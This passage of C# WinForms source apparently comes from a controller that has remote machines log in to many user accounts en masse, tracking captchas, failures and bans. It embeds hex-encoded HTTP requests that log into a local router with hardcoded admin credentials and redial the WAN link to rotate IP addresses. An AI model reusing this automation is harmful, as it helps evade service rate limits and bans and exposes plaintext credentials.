                                c.handle.Dispose();
                                lock (Sever.m_Clinets)
                                {
                                    Sever.bChanged = true;
                                    Sever.m_Clinets.Remove(c);
                                }
                            } break;
                    }
                }
                else
                {
                    Global.logger.Debug("没有设置mac和code,管理器主动断开连接");
                    c.handle.Shutdown(SocketShutdown.Both);
                }
            }
            catch (System.InvalidCastException)
            {

            }
            catch (System.Exception ex)
            {
                Global.logger.Debug("DoCmdError:" + ex.ToString());
            }
        }

        int sameCount = 0;
        Dictionary<string, int> captcha = new Dictionary<string, int>();
        Dictionary<string, int> changeiptimestamp = new Dictionary<string,int>();

        private void ShowLogFunc(eLoggerLevel c, string s)
        {
            if (this.InvokeRequired)
            {
                this.BeginInvoke(new Action<eLoggerLevel,string>(ShowLogFunc), c, s);
            }
            else
            {
                if (rlog.Items.Count > 500)
                {
                    rlog.Items.Clear();
                }
                if (s.Length > 512)
                {
                    s = s.Substring(0, 512) + "...";
                }
                rlog.Items.Add(s);
            }
        }

        private void Print(string s)
        {
            Global.logger.Debug(s);
        }

        Dictionary<string, string> m_Token = new Dictionary<string, string>();

        private void button1_Click(object sender, EventArgs e)
        {
            rlog.Items.Clear();
        }

        private DateTime _lastClearDateTime = DateTime.Now;
        private int _lastSendCheckMsg = System.Environment.TickCount;
        private int _lastCheckSessionConnect = System.Environment.TickCount;
        private int _lastCheckSessionActive = System.Environment.TickCount;

        private void timer_StatusBarRefresh_Tick(object sender, EventArgs e)
        {
            if (System.Environment.TickCount - _lastCheckSessionConnect > 3 * 1000)
            {
                _lastCheckSessionConnect = System.Environment.TickCount;
                if (Sever.bChanged)
                {
                    Sever.bChanged = false;
                    foreach (DataGridViewRow row in dgvSession.Rows)
                    {
                        if (row.IsNewRow)
                            continue;

                        bool x = false;

                        lock (Sever.m_Clinets)
                        {
                            for (int i = 0; i < Sever.m_Clinets.Count; ++i)
                            {
                                if (Sever.m_Clinets[i].m_mac == row.Cells["sMac"].Value.ToString())
                                {
                                    row.Cells["sState"].Value = "良好";
                                    x = true;
                                }
                            }
                        }
                        if (x == false)
                        {
                            row.Cells["sState"].Value = "已断开";
                        }
                    }
                }
            }

            if (System.Environment.TickCount - _lastCheckSessionActive > 5 * 60 * 1000)
            {
                _lastCheckSessionActive = System.Environment.TickCount;
                lock (Sever.m_Clinets)
                {
                    Global.logger.Debug("校验连接活跃度前:{0}", Sever.m_Clinets.Count);
                    Sever.m_Clinets.RemoveAll(delegate(Session s)
                    {
                        if (!s.IsActive)
                        {
                            Global.logger.Debug("session:{0},mac:{1},code:{2} 长时间不活动,主动断开连接"
                                , s.handle.RemoteEndPoint.ToString(), s.m_mac, s.m_code);
                            try
                            {
                                s.Send("0");
                            }
                            catch (System.Exception ex)
                            {
                                Global.logger.Debug("Terminate Error:{0}", ex.ToString());
                            }
                            return true;
                        }
                        return false;
                    });
                    Sever.bChanged = true;
                    Global.logger.Debug("校验连接活跃度后:{0}", Sever.m_Clinets.Count);
                }
            }

            StatusLab_SessionNum.Text = String.Format("实际连接:{0},macc:{1},speed:{2}/秒, captcha:{3}/{4}",
                Sever.m_Clinets.Count, macCheck.Count, ((float)_speedCount) / 3, sameCount, captcha.Count);
            _speedCount = 0;

            if (this.cbClearData.Checked == true)
            {
                if (DateTime.Now.Hour == 0 && DateTime.Now.Minute == 0)
                {
                    if (_lastClearDateTime.Day != DateTime.Now.Day
                        || _lastClearDateTime.Hour != DateTime.Now.Hour
                        || _lastClearDateTime.Minute != DateTime.Now.Minute)
                    {
                        Print("" + DateTime.Now + " 清空登陆数据!!");
                        btnClearLoginData_Click(null, null);
                        _lastClearDateTime = DateTime.Now;
                    }
                }
            }

            if (m_boNeedSaveData &&
                (System.Environment.TickCount - _lastSaveDataTime) > 120*1000)
            {
                SaveData();
                _lastSaveDataTime = System.Environment.TickCount;
            }
        }

        private int _lastSaveDataTime = System.Environment.TickCount;
        private  bool m_boNeedSaveData = false;

        //private void timer_FlushTextbox_Tick(object sender, EventArgs e)
        //{
            //if (m_textBoxBuffer.Length > 0)
            //{
            //    FlushToTextBox();
            //}
        //}

        //导出数据
        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                SaveFileDialog dlg = new SaveFileDialog();
                dlg.Filter = "保存类型 |*.txt";
                dlg.FilterIndex = 1;

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    Stream file = dlg.OpenFile();
                    StreamWriter write = new StreamWriter(file);

                    string fileTxt = "";
                    foreach (DataGridViewRow row in dgvUserData.Rows)
                    {
                        if (row.IsNewRow) { continue; }

                        for (int i = 0; i < row.Cells.Count; ++i)
                        {
                            if (i > 0)
                            {
                                fileTxt += "----";
                            }
                            if (row.Cells[i].Value != null)
                            {
                                string s = "" + row.Cells[i].Value;

                                fileTxt += s;
                            }
                            else
                            {
                                fileTxt += "(NULL)";
                            }
                        }

                        write.WriteLine(fileTxt);

                        fileTxt = "";
                    }

                    write.Flush();
                    write.Close();
                    file.Close();
                }
            }
            catch (System.Exception ex)
            {
            	
            }
        }

        private void btnClearLoginData_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow row in dgvUserData.Rows)
            {
                if (row.IsNewRow) { continue; }
                row.Cells["Checked"].Value = null;
                row.Cells["State"].Value = null;
                row.Cells["IP"].Value = null;
                row.Cells["Code"].Value = null;
                row.Cells["CheckTime"].Value = null;
                row.Cells["FailedCount"].Value = null;
            }

            List<userinfo> userlist = new List<userinfo>();
            foreach (userinfo info in m_userinfos.Values)
            {
                userinfo newInfo = new userinfo();
                newInfo.username = info.username;
                newInfo.password = info.password;
                userlist.Add(newInfo);
            }

            m_userinfos.Clear();
            foreach (userinfo info in userlist)
            {
                m_userinfos.Add(info.username, info);
            }

            m_checkuserinfos.Clear();
            foreach (userinfo info in m_userinfos.Values)
            {
                if (info.bocheck == 0
                    && info.failedcount <= 1
                    && info.status != "密码错误"
                    && info.status != "封停"
                    && info.status != "签到完成")
                {
                    m_checkuserinfos.Add(info.username, info);
                }
            }

            _working_state = working_state.normal;
        }

        private void cbClearData_CheckedChanged(object sender, EventArgs e)
        {
            if (this.cbClearData.Checked == true)
            {
                IniWriteValue("UI", "cbClearData", "1");
            }
            else
            {
                IniWriteValue("UI", "cbClearData", "0");
            }
        }

        private void cbFailedFirst_CheckedChanged(object sender, EventArgs e)
        {
            if (this.cbFailedFirst.Checked == true)
            {
                IniWriteValue("UI", "cbFailedFirst", "1");
            }
            else
            {
                IniWriteValue("UI", "cbFailedFirst", "0");
            }
        }

        private void cbRoutineIp_CheckedChanged(object sender, EventArgs e)
        {
            if (this.cbRoutineIp.Checked == true)
            {
                IniWriteValue("UI", "cbRoutineIp", "1");
            }
            else
            {
                IniWriteValue("UI", "cbRoutineIp", "0");
            }
        }

        private void dgvData_RowPostPaint(object sender, DataGridViewRowPostPaintEventArgs e)
        {
            //Color color = dgvUserData.RowHeadersDefaultCellStyle.ForeColor;
            //if (dgvUserData.Rows[e.RowIndex].Selected)
            //    color = dgvUserData.RowHeadersDefaultCellStyle.SelectionForeColor;
            //else
            //    color = dgvUserData.RowHeadersDefaultCellStyle.ForeColor;

            //using (SolidBrush b = new SolidBrush(color))
            //{
            //    e.Graphics.DrawString((e.RowIndex + 1).ToString(), e.InheritedRowStyle.Font, b, e.RowBounds.Location.X + 10, e.RowBounds.Location.Y + 6);
            //}
        }

        private void dgvSession_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            if (dgvSession.Columns[e.ColumnIndex].HeaderText == "断开连接")
            {
                if (!dgvSession.Rows[e.RowIndex].IsNewRow)
                {
                    lock (Sever.m_Clinets)
                    {
                        for (int i = 0; i < Sever.m_Clinets.Count; ++i)
                        {
                            Session s = Sever.m_Clinets[i];
                            if (s.handle.RemoteEndPoint.ToString() == dgvSession.Rows[e.RowIndex].Cells["sIP"].Value.ToString())
                            {
                                s.handle.Shutdown(SocketShutdown.Both);
                            }
                        }
                    }
                }
            }
            else if (dgvSession.Columns[e.ColumnIndex].HeaderText == "重启登陆机")
            {
                if (!dgvSession.Rows[e.RowIndex].IsNewRow)
                {
                    lock (Sever.m_Clinets)
                    {
                        for (int i = 0; i < Sever.m_Clinets.Count; ++i)
                        {
                            Session s = Sever.m_Clinets[i];
                            if (s.handle.RemoteEndPoint.ToString() == dgvSession.Rows[e.RowIndex].Cells["sIP"].Value.ToString())
                            {
                                s.Send("101$reboot");
                            }
                        }
                    }
                }
            }
        }

        private void cbRemoteReboot_CheckedChanged(object sender, EventArgs e)
        {
            if (this.cbRemoteReboot.Checked == true)
            {
                IniWriteValue("UI", "cbRemoteReboot", "1");
            }
            else
            {
                IniWriteValue("UI", "cbRemoteReboot", "0");
            }
        }

        private void tmReboot_Tick(object sender, EventArgs e)
        {
            if (cbRemoteReboot.Checked)
            {
                Print("执行检测登陆状况...");
                foreach (DataGridViewRow row in dgvSession.Rows)
                {
                    try
                    {
                        if (row.IsNewRow) continue;
                        if (row.Cells["sState"].Value.ToString().Equals("良好"))
                        {
                            string remotePoint = row.Cells["sIP"].Value.ToString();
                            DateTime lastTime = Convert.ToDateTime(row.Cells["sLoginState"].Value.ToString());
                            TimeSpan ts = DateTime.Now - lastTime;

                            if (ts.TotalSeconds > 40)
                            {
                                Print("mac:" + row.Cells["sMac"].Value + " code:" + row.Cells["sCode"].Value + " " + Convert.ToInt32(ts.TotalSeconds) + "秒未登陆!");
                            }
                            if (ts.TotalMinutes > 5)
                            {
                                lock (Sever.m_Clinets)
                                {
                                    for (int i = 0; i < Sever.m_Clinets.Count; ++i)
                                    {
                                        Session s = Sever.m_Clinets[i];
                                        if (s.handle.RemoteEndPoint.ToString() == remotePoint && !s.m_sp)
                                        {
                                            Print("mac:" + s.m_mac + " code:"+s.m_code + " 长时间未登陆成功账号..发送重启命令!!");
                                            s.Send("101$reboot");
                                            row.Cells["sLoginState"].Value = DateTime.Now.ToLocalTime();
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch(Exception ex)
                    {
                        Print(ex.ToString());
                    }
                }
            }
        }


        protected override void OnClosing(CancelEventArgs e)
        {
            if (m_boNeedSaveData)
            {
                SaveData();
                Thread.Sleep(3000);
            }
            CLogger.StopAllLoggers();
            base.OnClosing(e);
        }


        private void btnRoutineIp_Click(object sender, EventArgs e)
        {
            lock (Sever.m_Clinets)
            {
                for (int i = 0; i < Sever.m_Clinets.Count; ++i)
                {
                    Session s = Sever.m_Clinets[i];

                    Global.logger.Debug("测试通知客户机换ip!");
                    s.Send("102$changeip");
                 }
            }
        }

        private void ChangeRoutineIp()
        {
            
        }

        //private void RoutineIp_1()
        //{
        //    do
        //    {
        //        byte[] recv = new byte[10024];

        //        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //        socket.Connect("192.168.0.1", 80);
        //        socket.Send(loginData);

        //        socket.Receive(recv);
        //        socket.Receive(recv);
        //    } while (false);

        //    do
        //    {
        //        byte[] recv = new byte[10024];

        //        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //        socket.Connect("192.168.0.1", 80);
        //        socket.Send(disconnectData);

        //        socket.Receive(recv);
        //        socket.Receive(recv);
        //    } while (false);

        //    Thread.Sleep(10000);

        //    do
        //    {
        //        byte[] recv = new byte[10024];

        //        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //        socket.Connect("192.168.0.1", 80);
        //        socket.Send(loginData);

        //        socket.Receive(recv);
        //        socket.Receive(recv);
        //    } while (false);

        //    do
        //    {
        //        byte[] recv = new byte[10024];

        //        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //        socket.Connect("192.168.0.1", 80);
        //        socket.Send(connectData);

        //        socket.Receive(recv);
        //        socket.Receive(recv);

        //    } while (false); 
        //}


#region 
        byte[] loginData = {
0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x4c, 0x6f, 
0x67, 0x69, 0x6e, 0x43, 0x68, 0x65, 0x63, 0x6b, 
0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 
0x31, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 
0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 
0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x20, 0x61, 0x70, 
0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 
0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 
0x78, 0x6d, 0x6c, 0x2c, 0x20, 0x2a, 0x2f, 0x2a, 
0x0d, 0x0a, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 
0x72, 0x3a, 0x20, 0x68, 0x74, 0x74, 0x70, 0x3a, 
0x2f, 0x2f, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 
0x38, 0x2e, 0x30, 0x2e, 0x31, 0x2f, 0x6c, 0x6f, 
0x67, 0x69, 0x6e, 0x2e, 0x61, 0x73, 0x70, 0x0d, 
0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 
0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 
0x3a, 0x20, 0x7a, 0x68, 0x2d, 0x43, 0x4e, 0x0d, 
0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 
0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 
0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 
0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 
0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 
0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 
0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 
0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 
0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 
0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 
0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 
0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 
0x65, 0x3a, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 
0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 
0x2d, 0x77, 0x77, 0x77, 0x2d, 0x66, 0x6f, 0x72, 
0x6d, 0x2d, 0x75, 0x72, 0x6c, 0x65, 0x6e, 0x63, 
0x6f, 0x64, 0x65, 0x64, 0x0d, 0x0a, 0x41, 0x63, 
0x63, 0x65, 0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 
0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x67, 
0x7a, 0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 
0x6c, 0x61, 0x74, 0x65, 0x0d, 0x0a, 0x48, 0x6f, 
0x73, 0x74, 0x3a, 0x20, 0x31, 0x39, 0x32, 0x2e, 
0x31, 0x36, 0x38, 0x2e, 0x30, 0x2e, 0x31, 0x0d, 
0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 
0x2d, 0x4c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x3a, 
0x20, 0x34, 0x32, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 
0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 
0x20, 0x4b, 0x65, 0x65, 0x70, 0x2d, 0x41, 0x6c, 
0x69, 0x76, 0x65, 0x0d, 0x0a, 0x43, 0x61, 0x63, 
0x68, 0x65, 0x2d, 0x43, 0x6f, 0x6e, 0x74, 0x72, 
0x6f, 0x6c, 0x3a, 0x20, 0x6e, 0x6f, 0x2d, 0x63, 
0x61, 0x63, 0x68, 0x65, 0x0d, 0x0a, 0x0d, 0x0a, 
0x55, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 
0x3d, 0x61, 0x64, 0x6d, 0x69, 0x6e, 0x26, 0x63, 
0x68, 0x65, 0x63, 0x6b, 0x45, 0x6e, 0x3d, 0x30, 
0x26, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 
0x64, 0x3d, 0x61, 0x73, 0x64, 0x31, 0x32, 0x33, 
0x35, 0x38 };


        byte[] disconnectData = {
0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x67, 0x6f, 
0x66, 0x6f, 0x72, 0x6d, 0x2f, 0x53, 0x79, 0x73, 
0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x48, 0x61, 
0x6e, 0x64, 0x6c, 0x65, 0x20, 0x48, 0x54, 0x54, 
0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x41, 
0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 
0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 
0x2c, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 
0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 
0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 
0x20, 0x2a, 0x2f, 0x2a, 0x0d, 0x0a, 0x52, 0x65, 
0x66, 0x65, 0x72, 0x65, 0x72, 0x3a, 0x20, 0x68, 
0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x31, 0x39, 
0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x30, 0x2e, 
0x31, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 
0x5f, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x2e, 
0x61, 0x73, 0x70, 0x0d, 0x0a, 0x41, 0x63, 0x63, 
0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 
0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 
0x2d, 0x43, 0x4e, 0x0d, 0x0a, 0x55, 0x73, 0x65, 
0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 
0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 
0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 
0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 
0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 
0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 
0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 
0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 
0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 
0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 
0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 
0x2d, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x61, 
0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 
0x6f, 0x6e, 0x2f, 0x78, 0x2d, 0x77, 0x77, 0x77, 
0x2d, 0x66, 0x6f, 0x72, 0x6d, 0x2d, 0x75, 0x72, 
0x6c, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x65, 0x64, 
0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 
0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 
0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 
0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 
0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 
0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 
0x30, 0x2e, 0x31, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 
0x74, 0x65, 0x6e, 0x74, 0x2d, 0x4c, 0x65, 0x6e, 
0x67, 0x74, 0x68, 0x3a, 0x20, 0x34, 0x31, 0x0d, 
0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 
0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x4b, 0x65, 0x65, 
0x70, 0x2d, 0x41, 0x6c, 0x69, 0x76, 0x65, 0x0d, 
0x0a, 0x43, 0x61, 0x63, 0x68, 0x65, 0x2d, 0x43, 
0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x3a, 0x20, 
0x6e, 0x6f, 0x2d, 0x63, 0x61, 0x63, 0x68, 0x65, 
0x0d, 0x0a, 0x43, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 
0x3a, 0x20, 0x6c, 0x61, 0x6e, 0x67, 0x75, 0x61, 
0x67, 0x65, 0x3d, 0x63, 0x6e, 0x3b, 0x20, 0x61, 
0x64, 0x6d, 0x69, 0x6e, 0x3a, 0x6c, 0x61, 0x6e, 
0x67, 0x75, 0x61, 0x67, 0x65, 0x3d, 0x63, 0x6e, 
0x0d, 0x0a, 0x0d, 0x0a, 0x43, 0x4d, 0x44, 0x3d, 
0x57, 0x41, 0x4e, 0x5f, 0x43, 0x4f, 0x4e, 0x26, 
0x47, 0x4f, 0x3d, 0x73, 0x79, 0x73, 0x74, 0x65, 
0x6d, 0x5f, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 
0x2e, 0x61, 0x73, 0x70, 0x26, 0x61, 0x63, 0x74, 
0x69, 0x6f, 0x6e, 0x3d, 0x34 };


        byte[] connectData = {
0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x67, 0x6f, 
0x66, 0x6f, 0x72, 0x6d, 0x2f, 0x53, 0x79, 0x73, 
0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x48, 0x61, 
0x6e, 0x64, 0x6c, 0x65, 0x20, 0x48, 0x54, 0x54, 
0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x41, 
0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 
0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 
0x2c, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 
0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 
0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 
0x20, 0x2a, 0x2f, 0x2a, 0x0d, 0x0a, 0x52, 0x65, 
0x66, 0x65, 0x72, 0x65, 0x72, 0x3a, 0x20, 0x68, 
0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x31, 0x39, 
0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x30, 0x2e, 
0x31, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 
0x5f, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x2e, 
0x61, 0x73, 0x70, 0x0d, 0x0a, 0x41, 0x63, 0x63, 
0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 
0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 
0x2d, 0x43, 0x4e, 0x0d, 0x0a, 0x55, 0x73, 0x65, 
0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 
0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 
0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 
0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 
0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 
0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 
0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 
0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 
0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 
0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 
0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 
0x2d, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x61, 
0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 
0x6f, 0x6e, 0x2f, 0x78, 0x2d, 0x77, 0x77, 0x77, 
0x2d, 0x66, 0x6f, 0x72, 0x6d, 0x2d, 0x75, 0x72, 
0x6c, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x65, 0x64, 
0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 
0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 
0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 
0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 
0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 
0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 
0x30, 0x2e, 0x31, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 
0x74, 0x65, 0x6e, 0x74, 0x2d, 0x4c, 0x65, 0x6e, 
0x67, 0x74, 0x68, 0x3a, 0x20, 0x34, 0x31, 0x0d, 
0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 
0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x4b, 0x65, 0x65, 
0x70, 0x2d, 0x41, 0x6c, 0x69, 0x76, 0x65, 0x0d, 
0x0a, 0x43, 0x61, 0x63, 0x68, 0x65, 0x2d, 0x43, 
0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x3a, 0x20, 
0x6e, 0x6f, 0x2d, 0x63, 0x61, 0x63, 0x68, 0x65, 
0x0d, 0x0a, 0x43, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 
0x3a, 0x20, 0x6c, 0x61, 0x6e, 0x67, 0x75, 0x61, 
0x67, 0x65, 0x3d, 0x63, 0x6e, 0x3b, 0x20, 0x61, 
0x64, 0x6d, 0x69, 0x6e, 0x3a, 0x6c, 0x61, 0x6e, 
0x67, 0x75, 0x61, 0x67, 0x65, 0x3d, 0x63, 0x6e, 
0x0d, 0x0a, 0x0d, 0x0a, 0x43, 0x4d, 0x44, 0x3d, 
0x57, 0x41, 0x4e, 0x5f, 0x43, 0x4f, 0x4e, 0x26, 
0x47, 0x4f, 0x3d, 0x73, 0x79, 0x73, 0x74, 0x65, 
0x6d, 0x5f, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 
0x2e, 0x61, 0x73, 0x70, 0x26, 0x61, 0x63, 0x74, 
0x69, 0x6f, 0x6e, 0x3d, 0x33 };
#endregion

        private void btnRefreshGrid_Click(object sender, EventArgs e)
        {
            if (m_userinfos.Count > 10000)
            {
                DialogResult answer = MessageBox.Show("账号数量>10000,显示速度有点慢,是否继续?", "提示", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (answer != DialogResult.Yes)
                {
                    return;
                }
            }

            btnRefreshGrid.Enabled = false;
            this.Cursor = Cursors.WaitCursor;
            refreshGridView(ShowType.All);
            this.Cursor = Cursors.Default;
            btnRefreshGrid.Enabled = true;
        }

        private void btnShowOk_Click(object sender, EventArgs e)
        {
            btnShowOk.Enabled = false;
            this.Cursor = Cursors.WaitCursor;

            refreshGridView(ShowType.OK);

            this.Cursor = Cursors.Default;
            btnShowOk.Enabled = true;
        }

        private void btnShowFailed_Click(object sender, EventArgs e)
        {
            btnShowFailed.Enabled = false;
            this.Cursor = Cursors.WaitCursor;
            refreshGridView(ShowType.FAILED);
            this.Cursor = Cursors.Default;
            btnShowFailed.Enabled = true;
        }

        private void btnShowNotCheck_Click(object sender, EventArgs e)
        {
            btnShowNotCheck.Enabled = false;
            this.Cursor = Cursors.WaitCursor;
            refreshGridView(ShowType.NOTCHECK);
            this.Cursor = Cursors.Default;
            btnShowNotCheck.Enabled = true;
        }

        private void rbZone1_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "zone", "1");
        }

        private void rbZone2_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "zone", "2");
        }

        private void rbZone3_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "zone", "3");
        }


        private void rbZone4_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "zone", "4");
        }

        private void rdbZone5_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "zone", "5");
        }

        private void rdbLogin_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "State", "1");
        }

        private void radioChipState_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "State", "2");
        }

        private void rdbfun_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "State", "3");      //欢乐一线牵
        }

        private void rdbZhouNianLihe_CheckedChanged(object sender, EventArgs e)
        {
            IniWriteValue("UI", "State", "4");      //周年礼盒
        }

        private void Grid_Load(object sender, EventArgs e)
        {
            if (!Directory.Exists("captcha"))
            {
